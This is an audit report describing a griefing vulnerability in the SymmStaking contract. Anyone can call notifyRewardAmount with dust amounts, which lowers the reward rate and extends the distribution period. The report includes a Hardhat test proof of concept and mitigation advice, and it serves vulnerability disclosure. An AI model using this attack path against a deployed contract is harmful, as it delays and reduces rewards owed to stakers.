# Any User Can Manipulate Reward Rate and Extend Distribution Period, Delaying Fair and Timely Reward Distribution for Stakers

### Summary

Lack of access control on `SymmStaking::notifyRewardAmount` allows any user to manipulate the reward per second (`rewardState.rate`) and extend the reward distribution end period (`rewardState.periodFinish`) by passing in dust amounts of a whitelisted reward token. If the contract is still in an active distribution cycle (i.e., the previous distribution has not yet ended), it will recalculate `rewardState.rate` using the following formula:

```solidity
uint256 remaining = state.periodFinish - block.timestamp;
uint256 leftover = remaining * state.rate;
state.rate = (amount + leftover) / state.duration;
```
Additionally, it extends ``periodFinish`` by 1 week:

```solidity
// state.duration = 1 week
state.periodFinish = block.timestamp + state.duration;
```

Since there are no restrictions on calling this function, anyone can invoke it an unlimited number of times with dust amounts of a whitelisted reward token, artificially extending the vesting period while reducing per-second rewards, significantly delaying fair reward distribution for stakers.






### Root Cause
https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275 

`SymmStaking::notifyRewardAmount` lacks access control and does not enforce a minimum reward amount threshold either, allowing any user to repeatedly call it with dust amounts, manipulating `rewardState.rate` and continuously extending `rewardState.periodFinish`



### Internal Pre-conditions

1. Admin calls ``SymmStaking::configureRewardToken`` to whitelist a token as a reward token.
2. Any user calls ``SymmStaking::notifyRewardAmount`` with a dust amount of any whitelisted reward token while an active distribution cycle is ongoing.

### External Pre-conditions

None, vulnerability exists entirely within the `SymmStaking` contract and does not rely on any external protocol interactions.








### Attack Path

1. Admin calls `SymmStaking::configureRewardToken` to whitelist a token as a reward token.  
2. Any user calls `SymmStaking::notifyRewardAmount` with a dust amount of any whitelisted reward token while an active distribution cycle is ongoing.
3. `SymmStaking::_addRewardsForToken` recalculates `rewardState.rate`, incorporating the dust amount and remaining rewards, reducing the per-second reward rate.  
4. `rewardState.periodFinish` is extended by one week.  
5. Attacker can repeat this process continuously, keeping rewards artificially low and delaying fair distribution for stakers.

### Impact

Stakers experience prolonged reward distribution and reduced per-second rewards (`rewardState.rate`), as any user can repeatedly extend `rewardState.periodFinish` and manipulate `rewardState.rate` by calling `SymmStaking::notifyRewardAmount` with dust amounts. This prevents fair and timely reward allocation, forcing stakers to wait longer for their full rewards. The attacker gains no direct profit but can continuously grief the protocol and stakers, disrupting its intended functionality.


### PoC

Add the following test case in ``symmStaking.behavior.ts`` under the ``Notify`` describe block

```typescript
		it("should reduce the reward rate and prolong distribution with a dust amount", async function () {
			// Transfer 1000 USDT tokens to Bob (user2)
			await usdtToken.connect(admin).transfer(user2.address, 1000_000000)

			// Admin adds USDT as a reward token
			await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)

			// Admin approves and notifies the reward
			const rewardAmountUSDT = 604800_000000
			await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmountUSDT)
			await expect(symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmountUSDT])).to.be.ok

			// Alice (user1) stakes 100 SYMM tokens
			const depositAmount = e(100)
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)

			// Fast forward 1 day
			await time.increase(86400)

			let rewardStateBefore = await symmStaking.rewardState(await usdtToken.getAddress())

			// Reward rate = 1 USDT token per second
			expect(rewardStateBefore.rate).to.be.equal(1_000000)

			console.log("Reward per second BEFORE dust amount ->", rewardStateBefore.rate)
			console.log("Period finish date BEFORE dust amount ->", rewardStateBefore.periodFinish)

			const dustAmount = 10

			// Bob approves and notifies the reward with a dust amount
			await usdtToken.connect(user2).approve(await symmStaking.getAddress(), dustAmount)
			await expect(symmStaking.connect(user2).notifyRewardAmount([await usdtToken.getAddress()], [dustAmount])).to.be.ok

			await symmStaking.earned(user1.address, await usdtToken.getAddress())

			let rewardStateAfter = await symmStaking.rewardState(await usdtToken.getAddress())

			// @audit Reward per second decreases due to the dust amount
			console.log("Reward per second AFTER dust amount ->", rewardStateAfter.rate)

			// @audit Period finish is prolonged
			console.log("Period finish date AFTER dust amount ->", rewardStateAfter.periodFinish)
		})
```

### Mitigation

1. Restrict `SymmStaking::notifyRewardAmount` by adding an access control modifier (Recommended) 
2. Or, enforce a minimum reward distribution threshold to prevent manipulation with dust amounts.
